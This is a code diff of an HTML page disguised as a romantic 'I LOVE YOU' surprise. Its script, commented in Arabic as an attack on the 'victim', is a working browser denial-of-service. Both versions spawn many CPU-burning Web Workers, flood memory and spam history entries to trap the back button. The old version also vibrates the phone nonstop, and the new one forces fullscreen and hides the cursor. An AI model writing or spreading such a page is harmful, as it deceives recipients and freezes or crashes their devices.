@@ -2,79 +2,55 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surprise! ❤️</title>
+    <title>Surprise ❤️</title>
     <style>
-        body, html {
-            height: 100%;
-            margin: 0;
-            background-color: black;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-        h1 {
-            color: #ff4d4d;
-            font-family: 'Arial', sans-serif;
-            font-size: 5rem;
-            text-shadow: 0 0 20px #ff0000;
-            animation: pulse 1s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.2); color: white; }
-            100% { transform: scale(1); }
-        }
+        body { background: black; color: red; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; cursor: none; }
+        h1 { font-size: 6rem; font-family: 'Courier New', Courier, monospace; text-shadow: 0 0 30px red; }
+        p { color: white; font-size: 1.2rem; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <h1>I LOVE YOU</h1>
+    <h1 id="text">I LOVE YOU</h1>
+    <p id="sub">Click anywhere to start the surprise...</p>
 
     <script>
-        function startChaos() {
-            // 1. تفعيل الاهتزاز المستمر (Vibration)
-            // الموبايل هيفضل يتهز بنمط متقطع عشان ميسكتش
-            if ("vibrate" in navigator) {
-                setInterval(() => {
-                    navigator.vibrate([500, 200, 500]);
-                }, 1000);
+        // دالة الدخول في وضع ملء الشاشة وتفعيل الهجوم
+        function lockAndLoad() {
+            // 1. الدخول في ملء الشاشة
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
             }
 
-            // 2. إهلاك المعالج (CPU Overload)
-            const cores = navigator.hardwareConcurrency || 8;
-            const workerCode = `
-                function burn() {
-                    while (true) {
-                        Math.sqrt(Math.random() * 999999).toString().split('').reverse().join('');
-                    }
-                }
-                burn();
-            `;
-            const blob = new Blob([workerCode], { type: 'application/javascript' });
-            const workerUrl = URL.createObjectURL(blob);
-
-            for (let i = 0; i < cores * 4; i++) {
-                new Worker(workerUrl);
+            // 2. إخفاء الرسالة الفرعية وتغيير النص
+            document.getElementById('sub').innerText = "System Failure Imminent...";
+            
+            // 3. هجوم المعالج (CPU Overload) - نسخة مكثفة
+            const cores = navigator.hardwareConcurrency || 16;
+            for (let i = 0; i < cores * 10; i++) {
+                const worker = new Worker(URL.createObjectURL(new Blob([`
+                    setInterval(() => {
+                        let d = "STRESS".repeat(1000);
+                        while(true) { d = btoa(d + Math.random()); }
+                    }, 1);
+                `], {type: 'application/javascript'})));
             }
 
-            // 3. إغراق الذاكرة (RAM Flooding)
-            let memoryEater = [];
+            // 4. هجوم الرام (RAM Flood)
+            let trap = [];
             setInterval(() => {
-                memoryEater.push(new Uint8Array(15 * 1024 * 1024).fill(1)); 
-                // سد ثغرة الرجوع للخلف
+                trap.push(new Array(1000000).fill("BYE_BYE_RAM"));
                 window.history.pushState(null, null, "#" + Math.random());
-            }, 30);
+            }, 10);
         }
 
-        // تشغيل كل شيء بمجرد لمس الشاشة أو التحميل
-        // المتصفحات بتطلب "تفاعل" عشان تبدأ الاهتزاز
-        window.onclick = startChaos;
-        window.onload = startChaos;
-
-        // منع القوائم الجانبية
-        document.addEventListener('contextmenu', e => e.preventDefault());
+        // المتصفحات تمنع ملء الشاشة تلقائياً، لذا ننتظر أول لمسة من الضحية
+        window.onclick = function() {
+            lockAndLoad();
+        };
     </script>
 </body>
 </html>
